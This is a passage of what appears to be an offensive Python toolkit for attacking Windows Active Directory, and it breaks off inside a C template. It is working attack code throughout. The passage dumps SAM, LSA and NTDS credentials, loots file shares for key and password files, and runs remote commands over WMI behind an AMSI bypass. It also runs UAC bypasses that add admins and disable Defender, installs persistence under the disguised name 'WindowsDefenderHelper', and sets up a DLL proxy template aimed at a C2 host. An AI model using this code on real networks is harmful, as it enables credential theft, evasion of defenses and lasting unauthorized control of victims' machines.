        v = Vulnerability(name='Null SMB session', severity='MEDIUM')
        v.vulnerable = self.info.smb_anonymous
        v.evidence = 'anonymous SMB bind succeeded' if v.vulnerable else 'blocked'
        return v

    def _anonymous_ldap(self) -> Vulnerability:
        v = Vulnerability(name='Anonymous LDAP bind', severity='MEDIUM')
        v.vulnerable = self.info.ldap_anonymous
        v.evidence = 'unauthenticated LDAP works' if v.vulnerable else 'rejected'
        return v

    def _machine_account_quota(self) -> Optional[Vulnerability]:
        if not CAPS['ldap3']:
            return None
        v = Vulnerability(name='ms-DS-MachineAccountQuota > 0', severity='MEDIUM')
        try:
            server = Server(self.target, get_info=ALL, connect_timeout=self.timeout)
            conn = Connection(server, auto_bind=True, receive_timeout=self.timeout)
            base = next((nc for nc in (server.info.naming_contexts or [])
                         if nc.upper().startswith("DC=")), "")
            if base:
                conn.search(base, '(objectClass=domain)',
                            attributes=['ms-DS-MachineAccountQuota'])
                for e in conn.entries:
                    if 'ms-DS-MachineAccountQuota' in e:
                        q = int(e['ms-DS-MachineAccountQuota'].value or 0)
                        v.vulnerable = q > 0
                        v.evidence = f'MachineAccountQuota={q}'
                        break
            conn.unbind()
        except Exception:
            v.evidence = 'requires LDAP'
        return v

    def _adcs_detection(self) -> Vulnerability:
        v = Vulnerability(name='AD CS web enrollment', severity='INFO')
        if CAPS['requests']:
            for proto, port in (('http',80),('https',443)):
                try:
                    r = requests.get(f"{proto}://{self.target}:{port}/certsrv/",
                                     timeout=5, verify=False, allow_redirects=False)
                    if r.status_code in (200,401,302):
                        v.vulnerable = True
                        v.severity = 'HIGH'
                        v.evidence = f'/certsrv on {proto}:{port} → ESC8 candidate'
                        return v
                except Exception:
                    continue
        return v

    def _nopac_check(self) -> Vulnerability:
        v = Vulnerability(cve='CVE-2021-42278/42287', name='NoPac', severity='HIGH')
        os_lower = (self.info.os or '').lower()
        if any(ver in os_lower for ver in ('2008','2012','2016','2019')):
            v.vulnerable = True
            v.evidence = f'OS={self.info.os} pre-Nov2021 likely vulnerable'
        else:
            v.evidence = 'manual confirmation needed'
        return v


# ============================================================================
# BLOODHOUND / SHARE LOOT / SECRETS DUMP
# ============================================================================

class BloodHoundCollector:
    def __init__(self, target: str, auth: ADAuth, output_dir: Path,
                 collection: str = "Default", timeout: int = 600):
        self.target     = target
        self.auth       = auth
        self.output_dir = output_dir
        self.collection = collection
        self.timeout    = timeout

    def run(self) -> Dict[str, Any]:
        if not self.auth.has_creds:
            return {'error': 'requires credentials'}
        self.output_dir.mkdir(parents=True, exist_ok=True)
        if not CAPS['bloodhound_python']:
            return {'error': 'pip install bloodhound'}
        cwd = os.getcwd()
        try:
            os.chdir(self.output_dir)
            cmd = ['bloodhound-python', '-d', self.auth.domain, '-u', self.auth.username,
                   '-ns', self.auth.dc_ip or self.target, '-c', self.collection,
                   '--zip', '--disable-pooling']
            cmd += ['-p', self.auth.password] if not self.auth.hash else [
                '--hashes', f'{self.auth.lm}:{self.auth.nt}']
            rc, out, err = run_cmd(cmd, timeout=self.timeout)
            zips = sorted(Path('.').glob('*_bloodhound.zip'),
                          key=lambda p: p.stat().st_mtime, reverse=True)
            return {'returncode': rc, 'output_zip': str(zips[0].resolve()) if zips else '',
                    'stdout_tail': out[-1500:], 'stderr_tail': err[-500:]}
        finally:
            os.chdir(cwd)


class ShareLooter:
    SUSPICIOUS = re.compile(
        r'(unattend|sysprep|web\.config|machine\.config|wp-config|'
        r'\.kdbx|id_rsa|id_dsa|id_ed25519|\.ssh|\.aws|cred|password|secret|backup|'
        r'groups\.xml|gpp|unattend\.xml|\.ovpn|\.bak|\.env|\.pfx|\.p12)',
        re.IGNORECASE)

    def __init__(self, target: str, auth: ADAuth, shares: List[SMBShare], timeout: int = 30):
        self.target  = target
        self.auth    = auth
        self.shares  = shares
        self.timeout = timeout

    def run(self) -> List[LootItem]:
        if not CAPS['impacket']:
            return []
        loot: List[LootItem] = []
        try:
            smb = SMBConnection(self.target, self.target, sess_port=445, timeout=self.timeout)
            self.auth.smb_login(smb)
            for s in self.shares:
                if s.readable and s.type == 'DISK' and s.name != 'IPC$':
                    self._walk(smb, s.name, '*', loot)
            smb.logoff()
        except Exception as e:
            log(f"loot: {e}")
        return loot

    def _walk(self, smb, share: str, path: str, loot: List, depth: int = 0) -> None:
        if depth > 4:
            return
        try:
            entries = list(smb.listPath(share, path))
        except Exception:
            return
        for e in entries:
            name = e.get_longname()
            if name in ('.', '..'):
                continue
            full = f"{path[:-1]}\\{name}" if path.endswith('*') else f"{path}\\{name}"
            if e.is_directory():
                self._walk(smb, share, f"{full}\\*", loot, depth + 1)
            elif self.SUSPICIOUS.search(name):
                item = LootItem(share=share, path=full, type='file', size=int(e.get_filesize()))
                sev_map = {('.kdbx','.kdb','id_rsa','id_dsa'): 'CRITICAL',
                           ('groups.xml','unattend.xml','web.config'): 'HIGH'}
                item.severity = next((sv for exts,sv in sev_map.items()
                                      if any(name.lower().endswith(x) or x in name.lower()
                                             for x in exts)), 'MEDIUM')
                try:
                    from io import BytesIO
                    buf = BytesIO()
                    smb.getFile(share, full, buf.write)
                    item.content_preview = buf.getvalue()[:512].decode('utf-8', errors='replace')[:300]
                except Exception:
                    pass
                loot.append(item)


class SecretsDumper:
    def __init__(self, target: str, auth: ADAuth, output_dir: Path, timeout: int = 600):
        self.target     = target
        self.auth       = auth
        self.output_dir = output_dir
        self.timeout    = timeout

    def run(self) -> Dict[str, Any]:
        if not self.auth.has_creds:
            return {'error': 'requires credentials'}
        if not CAPS['secretsdump']:
            return {'error': 'pip install impacket'}
        self.output_dir.mkdir(parents=True, exist_ok=True)
        prefix = self.output_dir / f"dump-{ts()}"
        sd = shutil.which('secretsdump.py') or shutil.which('impacket-secretsdump')
        uri = f"{self.auth.domain}/{self.auth.username}@{self.target}"
        cmd = ([sd, '-hashes', f'{self.auth.lm}:{self.auth.nt}', '-outputfile', str(prefix), uri]
               if self.auth.hash else
               [sd, '-outputfile', str(prefix),
                f"{self.auth.domain}/{self.auth.username}:{self.auth.password}@{self.target}"])
        rc, out, err = run_cmd(cmd, timeout=self.timeout)
        sam, lsa, ntds, section = [], [], [], None
        for line in out.splitlines():
            if 'Dumping local SAM' in line:           section = 'sam'
            elif 'Dumping LSA Secrets' in line:       section = 'lsa'
            elif 'Dumping Domain Credentials' in line: section = 'ntds'
            elif section == 'sam'  and ':::' in line:  sam.append(line.strip())
            elif section == 'lsa'  and ':' in line:    lsa.append(line.strip())
            elif section == 'ntds' and ':::' in line:  ntds.append(line.strip())
        return {'returncode': rc, 'sam': sam, 'lsa': lsa, 'ntds': ntds,
                'output_files': [str(p) for p in self.output_dir.glob(f"{prefix.name}.*")],
                'stdout_tail': out[-1500:], 'stderr_tail': err[-500:]}


# ============================================================================
# REMOTE EXECUTION + PRIVESC AUDIT
# ============================================================================

AMSI_BYPASS = (
    "try{"
    "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
    "$b=$a.GetField('amsiInitFailed','NonPublic,Static');"
    "$b.SetValue($null,$true)"
    "}catch{}\n"
)

PRIVESC_PS1 = AMSI_BYPASS + r"""
$out = @{}
$os = Get-WmiObject Win32_OperatingSystem
$out['os'] = @{caption=$os.Caption; version=$os.Version; build=$os.BuildNumber
    hotfixes=@((Get-HotFix|Sort-Object InstalledOn -Descending|Select-Object -First 10|ForEach-Object{$_.HotFixID}))}
$svc_unquoted = @()
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.StartMode -ne 'Disabled'
} | ForEach-Object {
    $svc_unquoted += [PSCustomObject]@{name=$_.Name; path=$_.PathName; runAs=$_.StartName; state=$_.State}
}
$out['unquoted_services'] = $svc_unquoted
$writable_svc = @()
Get-WmiObject Win32_Service | Where-Object {$_.PathName -and $_.StartMode -ne 'Disabled'} | ForEach-Object {
    $p = ($_.PathName -replace '"','').Trim()
    if ($p -match '^([A-Za-z]:\\[^"]+\.exe)') {$p=$matches[1]} else {$p=$p.Split(' ')[0]}
    if (Test-Path $p -ErrorAction SilentlyContinue) {
        try {
            $acl = Get-Acl $p -ErrorAction Stop
            $acl.Access | Where-Object {
                ($_.IdentityReference -match 'Everyone|BUILTIN\\Users|Authenticated Users') -and
                ($_.FileSystemRights -match 'Write|FullControl|Modify')
            } | ForEach-Object {
                $writable_svc += [PSCustomObject]@{service=$_.Name; binary=$p; identity=$_.IdentityReference.Value; rights=$_.FileSystemRights.ToString()}
            }
        } catch {}
    }
}
$out['writable_service_binaries'] = $writable_svc
$aie_lm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aie_cu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
$out['always_install_elevated'] = ($aie_lm -eq 1 -and $aie_cu -eq 1)
$uac = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction SilentlyContinue
$out['uac'] = @{enabled=[bool]($uac.EnableLUA); consent_admin=$uac.ConsentPromptBehaviorAdmin; secure_desktop=$uac.PromptOnSecureDesktop}
$out['whoami_priv'] = (whoami /priv 2>&1|Out-String).Trim()
$out['whoami_groups'] = (whoami /groups 2>&1|Out-String).Trim()
try {$out['local_admins'] = @(net localgroup administrators 2>&1|Select-String -Pattern '^[A-Z]'|Where-Object{$_ -notmatch 'Alias|Comment|Members|command'}|ForEach-Object{$_.ToString().Trim()})} catch {$out['local_admins'] = @()}
$out['stored_creds'] = (cmdkey /list 2>&1|Out-String).Trim()
$tasks = @()
Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {
    $_.Principal.RunLevel -eq 'HighestAvailable' -or $_.Principal.UserId -match 'SYSTEM|NT AUTHORITY'
} | Select-Object -First 20 | ForEach-Object {
    $action = ($_.Actions|ForEach-Object{$_.Execute}|Select-Object -First 1)
    $tasks += [PSCustomObject]@{name=$_.TaskName; path=$_.TaskPath; runas=$_.Principal.UserId; action=$action}
}
$out['scheduled_tasks_elevated'] = $tasks
$writable_path = @()
($env:PATH -split ';') | Where-Object {$_ -ne ''} | ForEach-Object {
    $dir=$_; try {
        $f=Join-Path $dir "wa_$([System.IO.Path]::GetRandomFileName()).tmp"
        [System.IO.File]::WriteAllText($f,'x'); Remove-Item $f -ErrorAction SilentlyContinue
        $writable_path += $dir
    } catch {}
}
$out['writable_path_dirs'] = $writable_path
$autoruns = @()
@('HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
  'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
  'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
  'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce') | ForEach-Object {
    $rp=$_
    try {
        $vals=Get-ItemProperty $rp -ErrorAction SilentlyContinue
        if ($vals){$vals.PSObject.Properties|Where-Object{$_.Name -notmatch '^PS'}|ForEach-Object{
            $autoruns += [PSCustomObject]@{key=$rp; name=$_.Name; value=$_.Value}
        }}
    } catch {}
}
$out['autoruns'] = $autoruns
$out['lsa_limitblankpassword'] = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -ErrorAction SilentlyContinue).LimitBlankPasswordUse
$out | ConvertTo-Json -Depth 4 -Compress
"""


def _summarize_privesc(results: Dict[str, Any]) -> List[Dict[str, str]]:
    findings: List[Dict[str, str]] = []
    if results.get('always_install_elevated'):
        findings.append({'severity': 'CRITICAL', 'title': 'AlwaysInstallElevated',
                         'detail': 'Both HKLM+HKCU=1 — drop .msi for SYSTEM'})
    uac = results.get('uac') or {}
    if uac.get('enabled') is False:
        findings.append({'severity': 'HIGH', 'title': 'UAC Disabled', 'detail': 'EnableLUA=0'})
    elif uac.get('consent_admin') == 0:
        findings.append({'severity': 'HIGH', 'title': 'UAC auto-elevate (no prompt)',
                         'detail': 'ConsentPromptBehaviorAdmin=0'})
    for svc in (results.get('unquoted_services') or []):
        findings.append({'severity': 'HIGH', 'title': f"Unquoted svc: {svc.get('name','?')}",
                         'detail': str(svc.get('path',''))})
    for svc in (results.get('writable_service_binaries') or []):
        findings.append({'severity': 'CRITICAL',
                         'title': f"Writable svc binary: {svc.get('service','?')}",
                         'detail': f"{svc.get('binary','')} — {svc.get('rights','')}"})
    for d in (results.get('writable_path_dirs') or []):
        findings.append({'severity': 'MEDIUM', 'title': 'Writable PATH dir', 'detail': d})
    priv_text = results.get('whoami_priv', '')
    for priv in ('SeDebugPrivilege', 'SeImpersonatePrivilege', 'SeAssignPrimaryTokenPrivilege',
                 'SeTakeOwnershipPrivilege', 'SeBackupPrivilege', 'SeLoadDriverPrivilege'):
        idx = priv_text.find(priv)
        if idx != -1 and 'Enabled' in priv_text[idx:idx + 120]:
            findings.append({'severity': 'HIGH', 'title': f'Privilege: {priv}',
                             'detail': 'Enabled — privesc path available'})
    lbpu = results.get('lsa_limitblankpassword')
    if lbpu is not None and str(lbpu) in ('1', 'True'):
        findings.append({'severity': 'INFO', 'title': 'LimitBlankPasswordUse=1',
                         'detail': 'Blank-password network auth blocked; run lsa_fix to disable'})
    if 'Target:' in (results.get('stored_creds') or ''):
        findings.append({'severity': 'MEDIUM', 'title': 'Stored Windows creds (cmdkey)',
                         'detail': results['stored_creds'][:300]})
    return findings


class RemoteExec:
    def __init__(self, target: str, auth: ADAuth, timeout: int = 60):
        self.target  = target
        self.auth    = auth
        self.timeout = timeout

    def _exec_tool(self) -> Optional[str]:
        for name in ('impacket-wmiexec','wmiexec.py','impacket-smbexec','smbexec.py'):
            p = shutil.which(name)
            if p: return p
        return None

    def _uri(self) -> Tuple[List[str], str]:
        domain = self.auth.domain or 'WORKGROUP'
        user   = self.auth.username or ''
        if self.auth.hash:
            return ['-hashes', f'{self.auth.lm}:{self.auth.nt}'], f"{domain}/{user}@{self.target}"
        return [], f"{domain}/{user}:{self.auth.password or ''}@{self.target}"

    def _ps_enc(self, script: str) -> str:
        return base64.b64encode(script.encode('utf-16-le')).decode()

    def run_command(self, command: str) -> Dict[str, Any]:
        if not self.auth.has_creds:
            return {'error': 'requires credentials', 'output': '', 'returncode': -1}
        tool = self._exec_tool()
        if tool:
            extra, uri = self._uri()
            rc, out, err = run_cmd([tool] + extra + [uri, command], timeout=self.timeout)
            return {'returncode': rc, 'output': out, 'stderr': err, 'error': None}
        return self._wmi_native(command)

    def _wmi_native(self, command: str) -> Dict[str, Any]:
        if not CAPS['impacket']:
            return {'error': 'impacket not installed', 'output': ''}
        try:
            from impacket.dcerpc.v5.dcom import wmi
            from impacket.dcerpc.v5.dcomrt import DCOMConnection
            dcom = DCOMConnection(
                self.target,
                username=self.auth.username, password=self.auth.password or '',
                domain=self.auth.domain or '', lmhash=self.auth.lm or '',
                nthash=self.auth.nt or '', oxidResolver=True)
            iface  = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            login  = wmi.IWbemLevel1Login(iface)
            svcs   = login.NTLMLogin('//./root/cimv2', NULL, NULL)
            login.RemRelease()
            w32p, _ = svcs.GetObject('Win32_Process')
            fname    = f"wa_{int(time.time())}.txt"
            tmp_path = f"C:\\Windows\\Temp\\{fname}"
            w32p.Create(f'cmd.exe /Q /c {command} > "{tmp_path}" 2>&1', 'C:\\', None)
            time.sleep(min(5, max(2, self.timeout // 8)))
            smb = SMBConnection(self.target, self.target, sess_port=445, timeout=30)
            self.auth.smb_login(smb)
            from io import BytesIO
            buf = BytesIO()
            try:    smb.getFile('C$', f'Windows\\Temp\\{fname}', buf.write)
            except Exception: pass
            try:    smb.deleteFile('C$', f'Windows\\Temp\\{fname}')
            except Exception: pass
            smb.logoff(); dcom.disconnect()
            return {'returncode': 0, 'output': buf.getvalue().decode('utf-8', errors='replace'),
                    'error': None}
        except Exception as e:
            return {'error': str(e), 'output': ''}

    def run_privesc_audit(self, output_dir: Path) -> Dict[str, Any]:
        if not self.auth.has_creds:
            return {'error': 'requires credentials'}
        output_dir.mkdir(parents=True, exist_ok=True)
        b64 = self._ps_enc(PRIVESC_PS1)
        result = self.run_command(
            f'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {b64}')
        output  = result.get('output', '')
        raw_f   = output_dir / f"privesc-raw-{ts()}.txt"
        raw_f.write_text(output or '(no output)')
        parsed: Dict[str, Any] = {}
        for line in output.splitlines():
            line = line.strip()
            if line.startswith('{') and line.endswith('}'):
                try:    parsed = json.loads(line); break
                except json.JSONDecodeError: pass
        if parsed:
            (output_dir / f"privesc-{ts()}.json").write_text(json.dumps(parsed, indent=2))
        return {'results': parsed, 'raw_file': str(raw_f),
                'error': result.get('error'), 'findings': _summarize_privesc(parsed)}


# ============================================================================
# UAC BYPASS
# ============================================================================

class UACBypasser:
    """
    Remote UAC bypass via HKCU registry hijacking.
    Writes payload command to registry, triggers auto-elevating binary.
    Methods: fodhelper (ms-settings), eventvwr (mscfile).
    Requires existing low-priv WMI exec access (has_creds).
    """

    METHODS = {
        'fodhelper': {
            'reg_key': r'Software\Classes\ms-settings\shell\open\command',
            'trigger': 'C:\\Windows\\System32\\fodhelper.exe',
            'delegate': True,
        },
        'eventvwr': {
            'reg_key': r'Software\Classes\mscfile\shell\open\command',
            'trigger': 'C:\\Windows\\System32\\eventvwr.exe',
            'delegate': False,
        },
        'wsreset': {
            'reg_key': r'Software\Classes\AppX82a6gwre4fdg3ve545lekgax8iweaa2cs\Shell\open\command',
            'trigger': 'C:\\Windows\\System32\\wsreset.exe',
            'delegate': False,
        },
    }

    BUILTIN_PAYLOADS = {
        'lsa_fix': (
            'C:\\Windows\\System32\\reg.exe add '
            'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa '
            '/v LimitBlankPasswordUse /t REG_DWORD /d 0 /f'
        ),
        'add_admin': 'C:\\Windows\\System32\\net.exe localgroup administrators {username} /add',
        'disable_defender': (
            'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe '
            '-NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
        ),
        'enable_rdp': (
            'C:\\Windows\\System32\\reg.exe add '
            'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server '
            '/v fDenyTSConnections /t REG_DWORD /d 0 /f'
        ),
    }

    VERIFY = {
        'lsa_fix': ('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" '
                    '/v LimitBlankPasswordUse',
                    lambda o: 'LimitBlankPasswordUse' in o and '0x1' not in o and '0x0' in o),
        'add_admin': ('net localgroup administrators',
                      lambda o: True),  # caller checks username
    }

    def __init__(self, target: str, auth: ADAuth, timeout: int = 60):
        self.target  = target
        self.auth    = auth
        self._rex    = RemoteExec(target, auth, timeout=timeout)

    def _ps_enc(self, s: str) -> str:
        return base64.b64encode(s.encode('utf-16-le')).decode()

    def _write_hkcu(self, method: str, payload_cmd: str) -> None:
        m = self.METHODS[method]
        reg_key = m['reg_key'].replace('\\', '\\\\')
        ps = (
            f"$k='HKCU:\\{m['reg_key']}'\n"
            f"New-Item -Path $k -Force | Out-Null\n"
            f"Set-ItemProperty -Path $k -Name '(default)' -Value '{payload_cmd}'\n"
        )
        if m['delegate']:
            ps += f"New-ItemProperty -Path $k -Name 'DelegateExecute' -PropertyType String -Value '' -Force | Out-Null\n"
        self._rex.run_command(f'powershell -NoProfile -EncodedCommand {self._ps_enc(ps)}')

    def _clean_hkcu(self, method: str) -> None:
        reg_key = self.METHODS[method]['reg_key']
        base = '\\'.join(reg_key.split('\\')[:3])
        ps = f"Remove-Item -Path 'HKCU:\\{base}' -Recurse -Force -ErrorAction SilentlyContinue"
        self._rex.run_command(f'powershell -NoProfile -EncodedCommand {self._ps_enc(ps)}')

    def run(self, method: str = 'fodhelper', payload_type: str = 'lsa_fix',
            payload_cmd: Optional[str] = None) -> Dict[str, Any]:
        if not self.auth.has_creds:
            return {'error': 'requires credentials', 'bypassed': False}
        if method not in self.METHODS:
            return {'error': f'method must be: {list(self.METHODS)}', 'bypassed': False}
        cmd = payload_cmd
        if cmd is None:
            if payload_type not in self.BUILTIN_PAYLOADS:
                return {'error': f'payload_type must be: {list(self.BUILTIN_PAYLOADS)}',
                        'bypassed': False}
            cmd = self.BUILTIN_PAYLOADS[payload_type].format(
                username=self.auth.username or '')
        self._write_hkcu(method, cmd)
        self._rex.run_command(self.METHODS[method]['trigger'])
        time.sleep(5)
        verify_out, bypassed = '', False
        if payload_type in self.VERIFY:
            verify_cmd, check_fn = self.VERIFY[payload_type]
            vr = self._rex.run_command(verify_cmd)
            verify_out = vr.get('output', '')
            bypassed = check_fn(verify_out)
        self._clean_hkcu(method)
        return {
            'method': method,
            'trigger': self.METHODS[method]['trigger'],
            'payload_type': payload_type,
            'payload_cmd': cmd,
            'bypassed': bypassed,
            'verify_output': verify_out,
        }


# ============================================================================
# PERSISTENCE
# ============================================================================

class Persistence:
    """
    Install/remove Windows persistence mechanisms remotely.
    Methods: run_key (HKCU), startup_folder, scheduled_task, service, wmi_sub.
    run_key / startup_folder work as low-priv.
    service / wmi_sub require high-integrity or admin.
    """

    def __init__(self, target: str, auth: ADAuth, timeout: int = 60):
        self.target  = target
        self.auth    = auth
        self._rex    = RemoteExec(target, auth, timeout=timeout)

    def _ps_enc(self, s: str) -> str:
        return base64.b64encode(s.encode('utf-16-le')).decode()

    def install(self, exe_path: str, method: str = 'run_key',
                name: str = 'WindowsDefenderHelper',
                startup_delay: int = 0) -> Dict[str, Any]:
        """
        exe_path: full remote path to the payload EXE (e.g. C:\\Windows\\Temp\\svcx.exe)
        method: run_key | startup_folder | scheduled_task | service | wmi_sub | all_user
        name: task/service/key name to use
        """
        dispatch = {
            'run_key':       self._run_key,
            'startup_folder': self._startup_folder,
            'scheduled_task': self._scheduled_task,
            'service':        self._service,
            'wmi_sub':        self._wmi_sub,
            'all_user':       self._all_user_run_key,
        }
        fn = dispatch.get(method)
        if not fn:
            return {'error': f'method must be one of: {list(dispatch)}', 'success': False}
        return fn(exe_path, name, startup_delay)

    def remove(self, method: str, name: str = 'WindowsDefenderHelper') -> Dict[str, Any]:
        dispatch = {
            'run_key':        self._remove_run_key,
            'scheduled_task': self._remove_task,
            'service':        self._remove_service,
            'wmi_sub':        self._remove_wmi_sub,
        }
        fn = dispatch.get(method)
        if not fn:
            return {'error': 'unknown method', 'success': False}
        return fn(name)

    # ---- HKCU Run key (survives logon, no admin needed) ----
    def _run_key(self, exe: str, name: str, delay: int) -> Dict[str, Any]:
        ps = (f"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
              f"-Name '{name}' -Value '{exe}' -Force")
        r = self._rex.run_command(f'powershell -NoProfile -EncodedCommand {self._ps_enc(ps)}')
        return {'method': 'run_key', 'key': f'HKCU\\Run\\{name}', 'exe': exe,
                'success': not r.get('error'), 'error': r.get('error')}

    def _remove_run_key(self, name: str) -> Dict[str, Any]:
        ps = f"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{name}' -ErrorAction SilentlyContinue"
        self._rex.run_command(f'powershell -NoProfile -EncodedCommand {self._ps_enc(ps)}')
        return {'success': True}

    # ---- HKLM Run key (admin, all users) ----
    def _all_user_run_key(self, exe: str, name: str, delay: int) -> Dict[str, Any]:
        ps = (f"Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
              f"-Name '{name}' -Value '{exe}' -Force")
        r = self._rex.run_command(f'powershell -NoProfile -EncodedCommand {self._ps_enc(ps)}')
        return {'method': 'all_user_run_key', 'key': f'HKLM\\Run\\{name}', 'exe': exe,
                'success': not r.get('error'), 'error': r.get('error')}

    # ---- Current-user startup folder (no admin) ----
    def _startup_folder(self, exe: str, name: str, delay: int) -> Dict[str, Any]:
        ps = (
            f"$startup=$([Environment]::GetFolderPath('Startup'));"
            f"$dst=Join-Path $startup '{name}.exe';"
            f"Copy-Item -Path '{exe}' -Destination $dst -Force"
        )
        r = self._rex.run_command(f'powershell -NoProfile -EncodedCommand {self._ps_enc(ps)}')
        return {'method': 'startup_folder', 'destination': f'%APPDATA%\\Startup\\{name}.exe',
                'success': not r.get('error'), 'error': r.get('error')}

    # ---- Scheduled task (no admin for HKCU scope; /rl HIGHEST needs admin) ----
    def _scheduled_task(self, exe: str, name: str, delay: int) -> Dict[str, Any]:
        trigger = '/sc onlogon'
        delay_arg = f'/delay 0000:{delay:02d}' if delay else ''
        cmd = (f'schtasks /create /tn "{name}" /tr "{exe}" {trigger} {delay_arg} /f')
        r = self._rex.run_command(cmd)
        return {'method': 'scheduled_task', 'task': name, 'exe': exe,
                'success': r.get('returncode') == 0, 'output': r.get('output', '')[:300]}

    def _remove_task(self, name: str) -> Dict[str, Any]:
        r = self._rex.run_command(f'schtasks /delete /tn "{name}" /f')
        return {'success': r.get('returncode') == 0}

    # ---- Windows service (admin) ----
    def _service(self, exe: str, name: str, delay: int) -> Dict[str, Any]:
        r = self._rex.run_command(
            f'sc create "{name}" binpath= "{exe}" start= auto DisplayName= "{name}"')
        if r.get('returncode') == 0:
            self._rex.run_command(f'sc start "{name}"')
        return {'method': 'service', 'service': name, 'exe': exe,
                'success': r.get('returncode') == 0, 'output': r.get('output', '')[:300]}

    def _remove_service(self, name: str) -> Dict[str, Any]:
        self._rex.run_command(f'sc stop "{name}"')
        r = self._rex.run_command(f'sc delete "{name}"')
        return {'success': r.get('returncode') == 0}

    # ---- WMI event subscription (permanent, survives reboot, admin) ----
    def _wmi_sub(self, exe: str, name: str, delay: int) -> Dict[str, Any]:
        ps = f"""
$filter_name = '{name}_filter'
$consumer_name = '{name}_consumer'
$wmiNS = 'root\\subscription'
# Event filter — fires 60 seconds after system boot
$filter = Set-WmiInstance -Namespace $wmiNS -Class __EventFilter -Arguments @{{
    Name = $filter_name
    EventNamespace = 'root\\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 120"
}}
# Consumer — CommandLineEventConsumer runs the payload
$consumer = Set-WmiInstance -Namespace $wmiNS -Class CommandLineEventConsumer -Arguments @{{
    Name = $consumer_name
    CommandLineTemplate = '{exe}'
    ExecutablePath = '{exe}'
    WorkingDirectory = 'C:\\Windows\\Temp'
}}
# Binding
Set-WmiInstance -Namespace $wmiNS -Class __FilterToConsumerBinding -Arguments @{{
    Filter = $filter
    Consumer = $consumer
}}
Write-Output 'wmi_sub_ok'
"""
        r = self._rex.run_command(
            f'powershell -NoProfile -EncodedCommand {self._ps_enc(ps)}')
        success = 'wmi_sub_ok' in (r.get('output') or '')
        return {'method': 'wmi_sub', 'filter': f'{name}_filter',
                'consumer': f'{name}_consumer', 'exe': exe,
                'success': success, 'error': r.get('error')}

    def _remove_wmi_sub(self, name: str) -> Dict[str, Any]:
        ps = f"""
$wmiNS = 'root\\subscription'
Get-WmiObject -Namespace $wmiNS -Class __EventFilter | Where-Object {{$_.Name -eq '{name}_filter'}} | Remove-WmiObject
Get-WmiObject -Namespace $wmiNS -Class CommandLineEventConsumer | Where-Object {{$_.Name -eq '{name}_consumer'}} | Remove-WmiObject
Get-WmiObject -Namespace $wmiNS -Class __FilterToConsumerBinding | Remove-WmiObject
"""
        self._rex.run_command(
            f'powershell -NoProfile -EncodedCommand {self._ps_enc(ps)}')
        return {'success': True}


# ============================================================================
# C SOURCE TEMPLATES
# ============================================================================

PROXY_DLL_C = r"""
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <string.h>

#ifndef C2_HOST
#define C2_HOST L"192.168.1.114"
#endif
#ifndef C2_PORT
#define C2_PORT 9000
#endif
#ifndef C2_PATH
#define C2_PATH L"/update.bin"
#endif

/* ---- version.dll proxy types ---- */
typedef BOOL  (WINAPI *FN_GFVIA)(LPCSTR,DWORD,DWORD,LPVOID);
typedef BOOL  (WINAPI *FN_GFVIW)(LPCWSTR,DWORD,DWORD,LPVOID);
typedef BOOL  (WINAPI *FN_GFVIExA)(DWORD,LPCSTR,DWORD,DWORD,LPVOID);
typedef BOOL  (WINAPI *FN_GFVIExW)(DWORD,LPCWSTR,DWORD,DWORD,LPVOID);
typedef DWORD (WINAPI *FN_GFVISA)(LPCSTR,LPDWORD);
typedef DWORD (WINAPI *FN_GFVISW)(LPCWSTR,LPDWORD);
typedef DWORD (WINAPI *FN_GFVISExA)(DWORD,LPCSTR,LPDWORD);
typedef DWORD (WINAPI *FN_GFVISExW)(DWORD,LPCWSTR,LPDWORD);
typedef DWORD (WINAPI *FN_VFFA)(DWORD,LPSTR,LPSTR,LPSTR,LPSTR,PUINT,LPSTR,PUINT);
typedef DWORD (WINAPI *FN_VFFW)(DWORD,LPWSTR,LPWSTR,LPWSTR,LPWSTR,PUINT,LPWSTR,PUINT);
typedef DWORD (WINAPI *FN_VIFA)(DWORD,LPSTR,LPSTR,LPSTR,LPSTR,LPSTR,LPSTR,PUINT);
typedef DWORD (WINAPI *FN_VIFW)(DWORD,LPWSTR,LPWSTR,LPWSTR,LPWSTR,LPWSTR,LPWSTR,PUINT);
typedef DWORD (WINAPI *FN_VLNA)(DWORD,LPSTR,DWORD);
typedef DWORD (WINAPI *FN_VLNW)(DWORD,LPWSTR,DWORD);
typedef BOOL  (WINAPI *FN_VQVA)(LPCVOID,LPCSTR,LPVOID*,PUINT);
